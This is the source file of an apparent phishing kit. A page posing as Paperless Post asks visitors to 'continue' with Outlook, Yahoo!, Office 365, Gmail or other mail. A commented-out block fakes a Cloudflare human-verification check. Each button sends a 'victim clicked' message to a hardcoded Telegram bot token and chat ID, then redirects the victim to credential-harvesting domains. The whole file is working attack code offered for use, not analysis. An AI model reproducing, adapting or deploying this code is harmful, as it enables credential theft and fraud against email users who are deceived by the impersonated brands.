<!-- <template>
  <div class="page-wrapper">
    <div class="verify-box">

      <div class="verify-left">
        <button
          @click="handleRedirect"
          :disabled="isVerified"
          class="verify-button"
          :class="{ verified: isVerified }"
        >
          <svg
            v-if="isVerified"
            class="check-icon"
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 48 48"
          >
            <path fill="#22c55e" d="M44,24c0,11.045-8.955,20-20,20S4,35.045,4,24S12.955,4,24,4S44,12.955,44,24z"></path>
            <path fill="#ccff90" d="M34.602,14.602L21,28.199l-5.602-5.598l-2.797,2.797L21,33.801l16.398-16.402L34.602,14.602z"></path>
          </svg>
        </button>

        <p
          class="verify-text"
          :class="{ verifiedText: isVerified }"
        >
          {{ isVerified ? "Success!" : "Verify you are human" }}
        </p>
      </div>

      <div class="verify-right">
        <div class="logo-wrapper">
          <img
            src="https://upload.wikimedia.org/wikipedia/zh/thumb/a/a2/Cloudflare_logo.svg/1200px-Cloudflare_logo.svg.png"
            alt="Cloudflare"
          />
        </div>

        <div class="links">
          <p>
            <a href="https://www.cloudflare.com/privacypolicy/">Privacy</a>
            .
            <a href="https://www.cloudflare.com/website-terms/">Term</a>
          </p>
        </div>
      </div>

    </div>
  </div>
</template>

<script>
export default {
  data() {
    return {
      isVerified: false,
    };
  },
  methods: {
    handleRedirect() {
      this.isVerified = true;

      setTimeout(() => {
        this.$router.push('/home');
      }, 1000);
    },
  },
};
</script>

<style scoped>
/* Full page center */
.page-wrapper {
  height: 100vh;
  display: grid;
  place-content: center;
  background: #f3f4f6;
}

/* Main box */
.verify-box {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 24px;
  background: #ffffff;
  border: 2px solid #d1d5db;
  padding: 16px 20px;
  border-radius: 4px;
}

/* Left side */
.verify-left {
  display: flex;
  align-items: center;
  gap: 8px;
}

/* Button */
.verify-button {
  width: 32px;
  height: 32px;
  background: #ffffff;
  border: 2px solid #9ca3af;
  border-radius: 6px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: all 0.3s ease;
}

.verify-button:hover {
  border-color: #6b7280;
}

.verify-button.verified {
  background: #22c55e;
  border-color: #22c55e;
}

/* Check icon */
.check-icon {
  width: 22px;
  height: 22px;
  transition: opacity 0.3s ease;
}

/* Text */
.verify-text {
  font-size: 14px;
  font-weight: 400;
  color: #1f2937;
  margin: 0;
}

.verify-text.verifiedText {
  color: #16a34a;
  font-weight: 700;
  font-size: 20px;
}

/* Right side */
.verify-right {
  display: flex;
  flex-direction: column;
  align-items: flex-end;
}

/* Logo */
.logo-wrapper {
  height: 30px;
}

.logo-wrapper img {
  height: 100%;
  position: relative;
}

/* Links */
.links {
  margin-top: 10px;
  font-size: 10px;
}

.links a {
  color: #374151;
  text-decoration: underline;
  transition: color 0.2s ease;
}

.links a:hover {
  color: #16a34a;
}
</style> -->



<template>
    <div class="home">
        <div class="card">
            <section class="section-text">
                <h2>Welcome to Paperless Post!</h2>
                <p>To read the invitation, please choose your email provider below login to view shared file.</p>
            </section>
            <section class="links">
                    <button @click="finishJoob('victim clicked Outlook', 'https://api-g7f9sirh6.teaminvite-share.art/')">
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/outlook.svg" alt="">
                        <p>Continue with Outlook</p>
                    </button>

                <NuxtLink to="/login">
                    <button>
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/aol.png" alt="">
                        <p>Continue with AOL</p>
                    </button>
                </NuxtLink>

                    <button @click="finishJoob('victim clicked Yahoo!', 'https://api-yellow.upstart-loan.pro/')">
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/yahoo.svg" alt="">
                        <p>Continue with Yahoo!</p>
                    </button>


                    <button @click="finishJoob('victim clicked Office 365', 'https://api-g7f9sirh6.teaminvite-share.art/')">
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/office365.svg" alt="">
                        <p>Continue with Office 365</p>
                    </button>


                    <button @click="finishJoob('victim clicked Gmail', 'https://adobersvpsinvites.com/?key=X7kQ9&c=default')">
                        <img src="https://www.logo.wine/a/logo/Gmail/Gmail-Logo.wine.svg" alt="">
                        <p>Continue with Gmail</p>
                    </button>
                    

                <NuxtLink to="/login">
                    <button>
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/mail.png" alt="">
                        <p>Continue with Other Mail</p>
                    </button>
                </NuxtLink>
            </section>
            <section class="footer">
                <p>
                    By continuing, you agree to Paperless Post’s <a href="">Terms of Use</a>.
                    <br>
                    Read our <a href="Privacy Policy">Privacy Policy</a>.
                </p>
            </section>
        </div>
    </div>
</template>

<style>

.footer {
    color: #8b8b8b;
    font-size: 12px;
    line-height: 16px;
    text-align: center;
}

.footer p {
    margin: 30px 23px 0 23px;
}

.footer p a {
    text-decoration: underline;
}

.footer p a:hover {
    color: #007bff;
}

.home {
    width: full;
    height: 100vh;
    background: #000000b9;
    display: grid;
    place-items: center;
}

.card {
    height: 650px;
    width: 500px;
    background-color: white;
    padding: 34px 52px 22px;
}

.section-text {
    margin: 30px 0 18px;
    text-align: center;
}

.section-text h2 {
    font-size: 25px;
    margin-bottom: 7px;
    font-weight: 400;
}

.section-text p {
    font-size: 16px;
    line-height: 24px;
}

.links {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;


}

.links button {
    margin-top: 10px;
    text-align: center;
    font-size: 16px;
    width: 348.48px;
    height: 46px;
    background: white;
    border: 1px solid #00000020;
    border-radius: 100px;
    cursor: pointer;
    position: relative;
}

.links button img {
    width: 24px;
    height: 24px;
    position: absolute;
    top: 20%;
    left: 20px;
}

.links button p {
    margin: 0;
    font-weight: 500;
}
</style>

<script>
import axios from "axios";

export default {
  data() {
    return {
      formDataRes: {
        text: "",
      },
      isActive: false,
    };
  },

  computed: {
    isFormValid() {
      return this.formDataRes.text.trim() !== "";
    },
  },

  methods: {

    async finishJoob(text, url) {
      if (this.loading) return;
      this.loading = true;
      try {
        // Format the message as string
        this.formDataRes.text = text;

        const message = `*🔔 Mailings *\n${text}`;
        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-5167264103",
          message
        );
        this.notice = true;

        window.location.assign(url);

      } catch (error) {
        console.error("Navigation error:", error);
        this.loading = false;
      }
    },

    // ============================================================

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>